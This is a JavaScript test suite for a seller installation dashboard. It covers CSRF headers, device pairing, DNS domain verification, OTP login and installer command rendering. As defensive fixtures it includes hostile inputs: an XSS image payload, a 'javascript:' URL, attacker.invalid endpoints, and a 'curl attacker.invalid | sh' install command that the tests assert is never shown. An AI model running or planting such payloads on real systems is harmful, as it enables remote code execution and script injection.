import test from 'node:test';
import assert from 'node:assert/strict';
import { readFile } from 'node:fs/promises';
import { createServer } from 'node:http';
import { once } from 'node:events';
import { createRequire } from 'node:module';
const { JSDOM } = createRequire(import.meta.url)('jsdom');
import { createApi, createEmailAuth, mountDashboard, safeErrorMessage, statusLabel } from '../public/app.js';
import { serveDashboard } from '../dashboard.mjs';

const html = await readFile(new URL('../public/index.html', import.meta.url), 'utf8');
const installation = { installation_id: 'ins_synthetic_1', display_name: '<img src=x onerror=alert(1)>', domain: 'synthetic.example', status: 'DRAFT', app_version: null, last_heartbeat_at: null };
const response = (data, status = 200) => ({ ok: status < 400, status, json: async () => data });
const wait = () => new Promise(resolve => setTimeout(resolve, 10));

async function setup(t, route) {
  const dom = new JSDOM(html, { url: 'https://portal.fixture.example' });
  t.after(() => dom.window.close());
  const calls = [];
  const fetcher = async (url, options) => { calls.push({ url, options }); return route(url, options); };
  const app = mountDashboard(dom.window.document, fetcher);
  await app.start();
  return { dom, document: dom.window.document, calls };
}

test('same-origin client sends CSRF and idempotency only in headers, never URL', async () => {
  let call;
  const api = createApi(async (url, options) => { call = { url, options }; return response({ installation }); }, () => 'synthetic-csrf');
  await api('/installations', { method: 'POST', body: { domain: 'synthetic.example' }, idempotencyKey: 'synthetic-id' });
  assert.equal(call.options.headers['X-CSRF-Token'], 'synthetic-csrf');
  assert.equal(call.options.headers['Idempotency-Key'], 'synthetic-id');
  assert.equal(call.options.credentials, 'same-origin'); assert.equal(call.options.mode, 'same-origin');
  assert.equal(call.url.includes('csrf'), false);
});

test('missing identity provider and unauthenticated sessions never enable workspace', async t => {
  for (const [code, status] of [['AUTH_UNAVAILABLE', 503], ['AUTH_REQUIRED', 401]]) {
    const fixture = await setup(t, () => response({ error: { code } }, status));
    assert.equal(fixture.document.getElementById('workspace').hidden, true);
    assert.equal(fixture.document.getElementById('notice-message').textContent, safeErrorMessage(code));
    assert.equal(fixture.calls.length, 2);
  }
});

test('login link appears only for configured fixed same-origin identity entry point', async t => {
  for (const [login, visible] of [['/masuk', true], ['https://attacker.invalid/login', false]]) {
    const fixture = await setup(t, url => url === '/auth/status' ? response({ configured: true, method: 'email_otp', registration_url: '/daftar', login_url: login }) : response({ error: { code: 'AUTH_REQUIRED' } }, 401));
    assert.equal(fixture.document.getElementById('sign-in').hidden, !visible);
    assert.equal(fixture.document.getElementById('workspace').hidden, true);
  }
});

test('server data renders as text; uninstalled and unknown states never imply ready to sell', async t => {
  const fixture = await setup(t, url => url.endsWith('/session') ? response({ authenticated: true, csrf_token: 'synthetic-csrf' }) : url.endsWith('/installations') ? response({ installations: [installation] }) : response({ installation }));
  fixture.document.querySelector('.installation-item').click(); await wait();
  assert.equal(fixture.document.getElementById('detail-name').textContent, installation.display_name);
  assert.equal(fixture.document.getElementById('detail-name').querySelector('img'), null);
  assert.equal(fixture.document.getElementById('detail-version').textContent, 'Belum ada versi terlapor');
  assert.match(fixture.document.getElementById('detail-explanation').textContent, /belum dipasang/);
  assert.equal(statusLabel('UNREVIEWED_SUCCESS'), 'Status belum tersedia');
  assert.equal(fixture.document.querySelector('code'), null);
});

test('create intent preserves idempotency after network loss and uses real response', async t => {
  let createCount = 0;
  const fixture = await setup(t, (url, options) => {
    if (url.endsWith('/session')) return response({ authenticated: true, csrf_token: 'synthetic-csrf' });
    if (options.method === 'POST') { if (++createCount === 1) throw new Error('private upstream DSN must not render'); return response({ installation }); }
    if (url.endsWith('/installations')) return response({ installations: createCount > 1 ? [installation] : [] });
    return response({ installation });
  });
  fixture.document.getElementById('store-name').value = 'Synthetic'; fixture.document.getElementById('store-domain').value = 'synthetic.example';
  const form = fixture.document.getElementById('create-form');
  form.dispatchEvent(new fixture.dom.window.Event('submit', { bubbles: true, cancelable: true })); await wait();
  assert.equal(fixture.document.getElementById('create-error').textContent.includes('DSN'), false);
  form.dispatchEvent(new fixture.dom.window.Event('submit', { bubbles: true, cancelable: true })); await wait();
  const posts = fixture.calls.filter(call => call.options.method === 'POST');
  assert.equal(posts.length, 2); assert.equal(posts[0].options.headers['Idempotency-Key'], posts[1].options.headers['Idempotency-Key']);
  assert.equal(fixture.document.getElementById('installation-detail').hidden, false);
});

test('a device for another installation cannot expose confirmation or approve pairing', async t => {
  const fixture = await setup(t, (url, options) => {
    if (url.endsWith('/session')) return response({ authenticated: true, csrf_token: 'synthetic-csrf' });
    if (url.endsWith('/lookup')) return response({ installation_id: 'other-installation', pairing_session_id: 'pair_other', public_key_thumbprint: 'synthetic-public-thumbprint', scopes: ['release:read'], status: 'PENDING' });
    if (url.endsWith('/installations')) return response({ installations: [installation] });
    return response({ installation });
  });
  fixture.document.querySelector('.installation-item').click(); await wait();
  fixture.document.getElementById('pairing-code').value = 'ABCD-EFGH';
  fixture.document.getElementById('pairing-form').dispatchEvent(new fixture.dom.window.Event('submit', { bubbles: true, cancelable: true })); await wait();
  assert.equal(fixture.document.getElementById('pairing-confirm').hidden, true);
  assert.equal(fixture.document.getElementById('device-fingerprint').textContent, '');
  assert.equal(fixture.calls.some(call => call.url.endsWith('/approve')), false);
});

test('real pairing contract requires confirmation and refreshes authoritative detail', async t => {
  let paired = false;
  const fixture = await setup(t, (url, options) => {
    if (url.endsWith('/session')) return response({ authenticated: true, csrf_token: 'synthetic-csrf' });
    if (url.endsWith('/lookup')) return response({ installation_id: installation.installation_id, pairing_session_id: 'pair_synthetic', public_key_thumbprint: 'synthetic-public-thumbprint', scopes: ['release:read'], status: 'PENDING' });
    if (url.endsWith('/approve')) { paired = true; assert.deepEqual(JSON.parse(options.body), { user_code: 'ABCD-EFGH', public_key_thumbprint: 'synthetic-public-thumbprint', confirm: true }); return response({ installation_id: installation.installation_id, status: 'PAIRED' }); }
    if (url.endsWith('/installations')) return response({ installations: [{ ...installation, status: paired ? 'PAIRED' : 'DRAFT' }] });
    return response({ installation: { ...installation, status: paired ? 'PAIRED' : 'DRAFT' } });
  });
  fixture.document.querySelector('.installation-item').click(); await wait();
  fixture.document.getElementById('pairing-code').value = 'ABCD-EFGH';
  fixture.document.getElementById('pairing-form').dispatchEvent(new fixture.dom.window.Event('submit', { bubbles: true, cancelable: true })); await wait();
  assert.equal(fixture.document.getElementById('pairing-confirm').hidden, false);
  fixture.document.getElementById('confirm-device').checked = true;
  fixture.document.getElementById('pairing-confirm').dispatchEvent(new fixture.dom.window.Event('submit', { bubbles: true, cancelable: true })); await wait();
  assert.equal(paired, true); assert.equal(fixture.document.getElementById('detail-status').textContent, 'VPS terhubung');
  assert.match(fixture.document.getElementById('detail-explanation').textContent, /belum membuktikan/);
  assert.equal(fixture.document.getElementById('pairing-code').value, '');
  assert.equal(fixture.document.getElementById('device-fingerprint').textContent, '');
});

test('static HTTP handler has fixed allowlist and same-origin CSP', async t => {
  const server = createServer(async (req, res) => { if (!await serveDashboard(req, res)) { res.writeHead(404); res.end(); } });
  server.listen(0, '127.0.0.1'); await once(server, 'listening'); t.after(() => server.close());
  const origin = 'http://127.0.0.1:' + server.address().port;
  const page = await fetch(origin); assert.equal(page.status, 200);
  assert.match(page.headers.get('content-security-policy'), /connect-src 'self'/);
  assert.equal(page.headers.get('cache-control'), 'no-store');
  const pairingPage=await fetch(origin+'/hubungkan-server');assert.equal(pairingPage.status,200);assert.equal(await pairingPage.text(),html);
  assert.equal((await fetch(origin + '/PRODUCT.md')).status, 404);
  assert.equal((await fetch(origin + '/api/installer/v1/session')).status, 404);
});


test('DNS TXT instructions and confirmation remain separate from HTTPS and install status',async t=>{
  let challenge=null,found=false;
  const fixture=await setup(t,(url,options)=>{
    if(url.endsWith('/session'))return response({authenticated:true,csrf_token:'synthetic-csrf'});
    if(url.endsWith('/domain-challenges')&&options.method==='POST'){
      challenge={challenge_id:'fixture-proof',record_name:'_jetseller.synthetic.example',record_value:'jetseller-verification=synthetic-public-value',expires_at:'2030-01-01T00:00:00Z',status:'DNS_PENDING',verified_at:null};return response({challenge},201);
    }
    if(url.endsWith('/domain-challenges'))return response({challenge});
    if(url.endsWith('/verify')){challenge={...challenge,status:found?'OWNERSHIP_VERIFIED':'DNS_PENDING',verified_at:found?'2026-11-03T00:00:00Z':null};return response({challenge},found?200:202);}
    if(url.endsWith('/installations'))return response({installations:[installation]});
    return response({installation});
  });
  fixture.document.querySelector('.installation-item').click();await wait();
  assert.equal(fixture.document.getElementById('domain-proof-check').disabled,true);
  const submit=id=>fixture.document.getElementById(id).dispatchEvent(new fixture.dom.window.Event('submit',{bubbles:true,cancelable:true}));
  submit('domain-proof-create');await wait();
  assert.equal(fixture.document.getElementById('domain-proof-value').textContent,challenge.record_value);
  assert.equal(fixture.document.getElementById('domain-proof-check').disabled,false);
  submit('domain-proof-verify');await wait();assert.match(fixture.document.getElementById('domain-proof-status').textContent,/Menunggu/);
  found=true;submit('domain-proof-verify');await wait();
  assert.match(fixture.document.getElementById('domain-proof-status').textContent,/Kendali domain terverifikasi/);
  assert.equal(fixture.document.getElementById('domain-proof-check').disabled,true);
  assert.equal(fixture.document.getElementById('detail-status').textContent,'Rencana instalasi');
  assert.match(fixture.document.getElementById('domain-proof-status').textContent,/HTTPS dan aplikasi tetap perlu diperiksa/);
  const create=fixture.calls.find(c=>c.url.endsWith('/domain-challenges')&&c.options.method==='POST');assert.ok(create.options.headers['Idempotency-Key']);
});

test('email registration is offered only at the configured same-origin entry and logout revokes the local session', async t => {
  let authenticated = true;
  const fixture = await setup(t, (url, options) => {
    if (url.endsWith('/session/logout')) {
      assert.equal(options.method, 'POST'); assert.equal(options.headers['X-CSRF-Token'], 'synthetic-csrf');
      authenticated = false; return response({ logged_out: true });
    }
    if (url === '/auth/status') return response({ configured: true, method: 'email_otp', login_url: '/masuk', registration_url: '/daftar' });
    if (url.endsWith('/session')) return authenticated ? response({ authenticated: true, csrf_token: 'synthetic-csrf' }) : response({ error: { code: 'AUTH_REQUIRED' } }, 401);
    return response({ installations: [] });
  });
  fixture.document.getElementById('sign-out').click(); await wait();
  assert.equal(fixture.document.getElementById('workspace').hidden, true);
  assert.equal(fixture.document.getElementById('register').hidden, false);
  assert.equal(fixture.document.getElementById('register').getAttribute('href'), '/daftar');
  assert.match(fixture.document.getElementById('notice-message').textContent, /Sesi portal pada perangkat ini telah diakhiri/);
  const unsafe = await setup(t, url => url === '/auth/status' ? response({ configured: true, method: 'email_otp', login_url: '/masuk', registration_url: 'https://attacker.invalid/signup' }) : response({ error: { code: 'AUTH_REQUIRED' } }, 401));
  assert.equal(unsafe.document.getElementById('register').hidden, true);
});

const canonicalStore = { ...installation, installation_id: '550e8400-e29b-41d4-a716-446655440000', display_name: 'Independent Store', domain: 'synthetic.example', status: 'PAIRED' };
const release = (store = canonicalStore) => ({ installation_id: store.installation_id, available: true, release_id: 'rel-1.0.0-internal', installer: { url: 'https://releases.fixture.example/setup', sha256: 'a'.repeat(64), signature_url: 'https://releases.fixture.example/setup.sigstore.json' }, control_origin: 'https://portal.fixture.example', policy_url: 'https://releases.fixture.example/policy.json', policy_sha256: 'b'.repeat(64), root_sha256: 'c'.repeat(64), manifest_sha256: 'd'.repeat(64) });

test('wizard composes only fixed UUID-bound commands and keeps local readiness distinct from public storefront verification', async t => {
  let phase = 'DATABASE';
  const fixture = await setup(t, url => {
    if (url.endsWith('/session')) return response({ authenticated: true, csrf_token: 'synthetic-csrf' });
    if (url.endsWith('/installations')) return response({ installations: [canonicalStore] });
    if (url.endsWith('/install-instructions')) return response({ ...release(), commands: { install: 'curl attacker.invalid | sh' } });
    if (url.endsWith('/install-progress')) return response({ installation_id: canonicalStore.installation_id, phase, sequence: 7, updated_at: '2026-11-04T01:00:00Z', store_origin: 'https://synthetic.example' });
    if (url.endsWith('/domain-challenges')) return response({ challenge: null });
    return response({ installation: canonicalStore });
  });
  fixture.document.querySelector('.installation-item').click(); await wait();
  assert.equal(fixture.document.querySelectorAll('.wizard-steps li').length, 8);
  assert.match(fixture.document.getElementById('install-command').textContent, /--confirm-install 550e8400-e29b-41d4-a716-446655440000/);
  assert.match(fixture.document.getElementById('pair-command').textContent, /^sudo \/usr\/local\/bin\/jetseller-setup pair --profile p0-2-2-40 --state \/var\/lib\/jetseller-agent/);
  assert.doesNotMatch(fixture.document.getElementById('install-command').textContent, /curl|attacker|\|/);
  assert.match(fixture.document.getElementById('installer-status').textContent, /verifikasi independen/);
  assert.equal(fixture.document.getElementById('local-admin').hidden, true);
  phase = 'LOCAL_READINESS'; fixture.document.getElementById('refresh-progress').click(); await wait();
  assert.equal(fixture.document.getElementById('local-admin').href, 'https://synthetic.example/admin/setup');
  assert.equal(fixture.document.getElementById('local-products').href, 'https://synthetic.example/admin/products');
  assert.equal(fixture.document.getElementById('local-storefront').href, 'https://synthetic.example/');
  assert.match(fixture.document.getElementById('progress-status').textContent, /lokal dilaporkan/);
  assert.match(fixture.document.getElementById('activate-command').textContent, /activate-admin/);
  assert.doesNotMatch(fixture.document.getElementById('progress-status').textContent, /siap berjualan/);
  phase = 'READY'; fixture.document.getElementById('refresh-progress').click(); await wait();
  assert.equal(fixture.document.getElementById('local-admin').hidden, true);
  assert.match(fixture.document.getElementById('progress-status').textContent, /belum dapat dikonfirmasi/);
});

test('unavailable or malformed release metadata cannot publish executable commands or unsafe download links', async t => {
  for (const instructions of [
    { installation_id: canonicalStore.installation_id, available: false, reason: 'RELEASE_UNAVAILABLE' },
    { ...release(), control_origin: 'https://attacker.invalid' },
    { ...release(), installer: { ...release().installer, url: 'javascript:alert(1)' } },
    { ...release(), installation_id: 'another-owner' },
  ]) {
    const fixture = await setup(t, url => url.endsWith('/session') ? response({ authenticated: true, csrf_token: 'synthetic-csrf' }) : url.endsWith('/installations') ? response({ installations: [canonicalStore] }) : url.endsWith('/install-instructions') ? response(instructions) : response({ installation: canonicalStore }));
    fixture.document.querySelector('.installation-item').click(); await wait();
    assert.equal(fixture.document.getElementById('installer-release').hidden, true);
    assert.equal(fixture.document.getElementById('installer-download').hasAttribute('href'), false);
    assert.equal(fixture.document.getElementById('install-command').textContent, '');
  }
});

test('late release responses for seller A cannot replace the selected seller B instructions', async t => {
  const second = { ...canonicalStore, installation_id: '550e8400-e29b-41d4-a716-446655440001', display_name: 'Other Store', domain: 'other.example' };
  let resolveFirst;
  const fixture = await setup(t, url => {
    if (url.endsWith('/session')) return response({ authenticated: true, csrf_token: 'synthetic-csrf' });
    if (url.endsWith('/installations')) return response({ installations: [canonicalStore, second] });
    const store = url.includes(second.installation_id) ? second : canonicalStore;
    if (url.endsWith('/install-instructions')) return store === canonicalStore ? new Promise(resolve => { resolveFirst = resolve; }) : response(release(second));
    if (url.endsWith('/domain-challenges')) return response({ challenge: null });
    if (url.endsWith('/install-progress')) return response({ installation_id: store.installation_id, phase: 'NOT_STARTED', sequence: 0, updated_at: null });
    return response({ installation: store });
  });
  const buttons = fixture.document.querySelectorAll('.installation-item'); buttons[0].click(); await wait(); buttons[1].click(); await wait();
  resolveFirst(response(release())); await wait();
  assert.equal(fixture.document.getElementById('detail-id').textContent, second.installation_id);
  assert.match(fixture.document.getElementById('install-command').textContent, /446655440001/);
  assert.doesNotMatch(fixture.document.getElementById('install-command').textContent, /446655440000/);
});

test('passwordless registration verifies OTP and enters the store wizard without another login', async t => {
  let authenticated = false;
  const challenge = '550e8400-e29b-41d4-a716-446655440099';
  const fixture = await setup(t, (url, options) => {
    if (url === '/auth/status') return response({ configured:true,method:'email_otp',login_url:'/masuk',registration_url:'/daftar' });
    if (url.endsWith('/session')) return authenticated ? response({ authenticated:true,csrf_token:'synthetic-csrf' }) : response({error:{code:'AUTH_REQUIRED'}},401);
    if (url === '/auth/email/start') {
      assert.deepEqual(JSON.parse(options.body), {mode:'register',email:'seller@fixture.example',name:'Seller Name',store_name:'My Independent Store'});
      assert.equal(options.credentials,'same-origin');assert.equal(options.mode,'same-origin');assert.equal(options.redirect,'error');
      return response({status:'OTP_SENT',challenge_id:challenge,expires_in:600,resend_after:60});
    }
    if (url === '/auth/email/verify') {
      assert.deepEqual(JSON.parse(options.body),{challenge_id:challenge,code:'123456'});
      authenticated=true;return response({status:'AUTHENTICATED'});
    }
    return response({installations:[]});
  });
  assert.equal(fixture.document.getElementById('email-auth').hidden,false);
  fixture.document.getElementById('auth-toggle-register').click();
  fixture.document.getElementById('seller-name').value='Seller Name';fixture.document.getElementById('seller-store-name').value='My Independent Store';fixture.document.getElementById('seller-email').value='seller@fixture.example';
  const submit=id=>fixture.document.getElementById(id).dispatchEvent(new fixture.dom.window.Event('submit',{bubbles:true,cancelable:true}));
  submit('email-start-form');await wait();
  assert.equal(fixture.document.getElementById('email-verify-form').hidden,false);
  assert.equal(fixture.document.getElementById('email-resend').disabled,true);
  assert.match(fixture.document.getElementById('email-auth-status').textContent,/10 menit/);
  fixture.document.getElementById('email-code').value='123456';submit('email-verify-form');await wait();
  assert.equal(fixture.document.getElementById('email-auth').hidden,true);
  assert.equal(fixture.document.getElementById('workspace').hidden,false);
  assert.equal(fixture.document.getElementById('store-name').value,'My Independent Store');
  assert.equal(fixture.document.getElementById('email-code').value,'');
  assert.match(fixture.document.getElementById('action-announcement').textContent,/tanpa login ulang/);
  assert.equal(fixture.calls.some(call=>call.url.includes('123456')||call.url.includes(challenge)||call.url.includes('/auth/login')),false);
});

test('returning email login sends no fabricated profile and invalid OTP stays private', async t => {
  const fixture=await setup(t,(url,options)=>{
    if(url==='/auth/status')return response({configured:true,method:'email_otp',login_url:'/masuk',registration_url:'/daftar'});
    if(url==='/auth/email/start'){assert.deepEqual(JSON.parse(options.body),{mode:'login',email:'returning@fixture.example'});return response({status:'OTP_SENT',challenge_id:'550e8400-e29b-41d4-a716-446655440099',expires_in:600,resend_after:60});}
    if(url==='/auth/email/verify')return response({error:{code:'OTP_INVALID',message:'private upstream diagnostic'}},401);
    return response({error:{code:'AUTH_REQUIRED'}},401);
  });
  fixture.document.getElementById('seller-email').value='returning@fixture.example';
  const submit=id=>fixture.document.getElementById(id).dispatchEvent(new fixture.dom.window.Event('submit',{bubbles:true,cancelable:true}));
  submit('email-start-form');await wait();fixture.document.getElementById('email-code').value='000000';submit('email-verify-form');await wait();
  assert.equal(fixture.document.getElementById('workspace').hidden,true);
  assert.equal(fixture.document.getElementById('email-verify-form').hidden,false);
  assert.equal(fixture.document.getElementById('email-code').value,'');
  assert.match(fixture.document.getElementById('email-auth-error').textContent,/Kode belum cocok/);
  assert.doesNotMatch(fixture.document.body.textContent,/private upstream diagnostic|000000/);
});

test('account transport refuses arbitrary endpoints and does not require a post-login CSRF token for OTP proof', async()=>{
  let call;
  const request=createEmailAuth(async(url,options)=>{call={url,options};return response({status:'OTP_SENT'});});
  await assert.rejects(()=>request('https://attacker.invalid',{email:'x'}));
  await request('/auth/email/start',{mode:'login',email:'returning@fixture.example'});
  assert.equal(call.url,'/auth/email/start');assert.equal(call.options.headers['X-CSRF-Token'],undefined);assert.equal(call.options.credentials,'same-origin');
});
